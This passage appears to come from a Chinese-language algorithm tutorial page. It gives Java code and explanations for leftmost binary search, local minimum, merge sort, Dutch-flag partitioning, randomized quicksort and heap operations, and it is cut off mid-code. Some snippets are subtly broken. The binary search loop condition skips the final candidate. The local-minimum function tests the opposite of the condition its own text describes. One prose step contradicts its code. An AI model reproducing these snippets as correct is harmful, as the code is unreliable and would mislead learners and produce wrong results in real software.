title="在一个有序数组中，找&gt;=某个数最左侧的位置"></a>在一个有序数组中，找&gt;=某个数最左侧的位置</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">nearestIndex</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> <span class="token class-name">L</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> <span class="token class-name">R</span> <span class="token operator">=</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token class-name">L</span> <span class="token operator">&lt;</span> <span class="token class-name">R</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token class-name">L</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">R</span> <span class="token operator">-</span> <span class="token class-name">L</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                index <span class="token operator">=</span> mid<span class="token punctuation">;</span>                <span class="token class-name">R</span> <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">L</span> <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> index<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="局部最小值"><a href="#局部最小值" class="headerlink" title="局部最小值"></a>局部最小值</h3><p>对于位置0和位置length-1，只要位置0小于位置1或者位置length-1小于位置length-2，即可返回位置0或者位置length-1。否则对于i-1, i, i+1 如果位置i小于位置i-1和位置i+1，则位置i即为局部最小值。求出一个局部最小值的位置即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">BSlocalMin</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">int</span> <span class="token class-name">L</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> <span class="token class-name">R</span> <span class="token operator">=</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token class-name">R</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>arr<span class="token punctuation">[</span><span class="token class-name">R</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token class-name">R</span><span class="token punctuation">;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token class-name">L</span> <span class="token operator">&lt;</span> <span class="token class-name">R</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token class-name">L</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">R</span> <span class="token operator">-</span> <span class="token class-name">L</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> mid<span class="token punctuation">;</span>                <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token class-name">R</span> <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">else</span> <span class="token class-name">L</span> <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p>0, 1, 2, …, i, i+1, …, length-1</p><p>[0, m] [m+1, length-1] 分别使两个区间有序，然后设立辅助数组，将两个有序区间合并到辅助数组中即可</p><p>合并规则：在两个区间分别从头开始（即分别0和m+1开始）遍历，左侧区间如果 &lt;= 右侧，则拷贝左侧区间值到辅助数组中，然后遍历用的下标+1即可，否则就拷贝右侧区间值，然后下标+1，如果左侧或者右侧区间遍历用的下标越界，则将另一个区间的剩余值直接拷贝即可</p><p>最后将辅助数组拷贝至原数组</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">mergeSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">process</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">L</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">R</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">L</span> <span class="token operator">==</span> <span class="token class-name">R</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token class-name">L</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token operator">-</span><span class="token class-name">L</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token class-name">L</span><span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">R</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">merge</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token class-name">L</span><span class="token punctuation">,</span> mid<span class="token punctuation">,</span> <span class="token class-name">R</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">L</span><span class="token punctuation">,</span> <span class="token keyword">int</span> mid<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">R</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> p1 <span class="token operator">=</span> <span class="token class-name">L</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> p2 <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> help <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">R</span><span class="token operator">-</span><span class="token class-name">L</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p1<span class="token operator">&lt;=</span>mid<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>p2<span class="token operator">&lt;=</span><span class="token class-name">R</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        help<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>p1<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>p2<span class="token punctuation">]</span> <span class="token operator">?</span> arr<span class="token punctuation">[</span>p1<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">:</span> arr<span class="token punctuation">[</span>p2<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p1<span class="token operator">&lt;=</span>mid<span class="token punctuation">)</span> help<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>p1<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p2<span class="token operator">&lt;=</span><span class="token class-name">R</span><span class="token punctuation">)</span> help<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>p2<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token class-name">R</span><span class="token operator">-</span><span class="token class-name">L</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span><span class="token class-name">L</span><span class="token operator">+</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> help<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="荷兰国旗问题（快排引子）"><a href="#荷兰国旗问题（快排引子）" class="headerlink" title="荷兰国旗问题（快排引子）"></a>荷兰国旗问题（快排引子）</h2><h3 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h3><p>数组arr, 数num, 把小于等于num的数放在数组的左边，大于num的放在右边，要求空间复杂度O(1), 时间复杂度O(N)</p><blockquote><p>0, 1, 2, …, i, i+1, …, length-1</p><p>从头开启一个区域为小于等于num的区域，开始遍历</p><p>1）该数&lt;=num，则与区域的下一个数交换，区域++，i++</p><p>2）&gt;num，则i++</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">DutchFlagOne</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">int</span> lessEqualArea <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> num<span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">++</span>lessEqualArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h3><p>小于num的数放在数组的左边，等于num的放在中间，大于num的放在右边，要求空间复杂度O(1), 时间复杂度O(N)</p><blockquote><p>0, 1, 2, …, i, i+1, …, length-1</p><p>从头开启一个区域为小于num的区域，从尾开启大于num的区域，开始遍历</p><p>1）该数&lt;num，则与区域的下一个数交换，区域++，i++</p><p>2）==num，则i++</p><p>3）&gt;num，则与大于的区域的前一个数交换，区域–，i++</p><p>注意结束条件</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">DutchFlagTwo</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> lessArea <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> moreArea <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>moreArea<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> num<span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token operator">++</span><span class="token punctuation">,</span> <span class="token operator">++</span>lessArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> num<span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">--</span>moreArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p>0, 1, 2, …, i, i+1, …, length-1</p><h3 id="1-0"><a href="#1-0" class="headerlink" title="1.0"></a>1.0</h3><p>选择数组最后一个数为荷兰国旗问题中的num，将小于num的放在左侧，大于num的放在右侧，然后将num与大于num区域的最左侧的数交换，（…）num（…），再继续递归，对小于的区域和大于的区域进行同样的操作，即选最后一个数为num，…</p><h3 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h3><p>这次是分为三块，即小于，等于，大于</p><blockquote><p>对于1.0和2.0都存在极端情况为O(n2)，即数组已经排好序的情况</p></blockquote><h3 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h3><p>不选最后一个数为num，而是完全随机地选出数组中的某个数作为num，然后与最后一个数做交换，这样又回到了2.0的情况，这样保证了复杂度为O(n*logn)，一定不要忘记分完区域之后，将最后一个数与大于num区域最左侧的数交换</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">quickSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">quickSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">&lt;</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> l <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>r <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> num<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> p <span class="token operator">=</span> <span class="token function">partition</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//返回等于num的区域的左边界和右边界</span>        <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">partition</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> lessArea <span class="token operator">=</span> l<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> moreArea <span class="token operator">=</span> r<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>l<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>moreArea<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token operator">++</span><span class="token punctuation">,</span> <span class="token operator">++</span>lessArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">--</span>moreArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> moreArea<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>lessArea<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>moreArea<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><p>大根堆 - 以该节点为根节点的子树 最大值为该节点  即为大根堆</p><p>左孩子：i*2+1，右孩子：i*2+2，父：(i-1)/2</p><p><code>heapInsert</code>方法：往堆中插入一个数，使其继续满足大根堆</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">heapInsert</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>        index <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>heapify</code>方法：将index处的数取出，使其继续满足大根堆</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">heapify</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> heapSize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> left <span class="token operator">=</span> index <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left <span class="token operator">&lt;</span> heapSize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> largest <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> heapSize<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> left <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">:</span> left<span class="token punctuation">;</span>        largest <span class="token operator">=</span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">?</span> largest <span class="token operator">:</span> index<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>largest <span class="token operator">==</span> index<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> largest<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>        index <span class="token operator">=</span> largest<span class="token punctuation">;</span>        left <span class="token operator">=</span> index <span 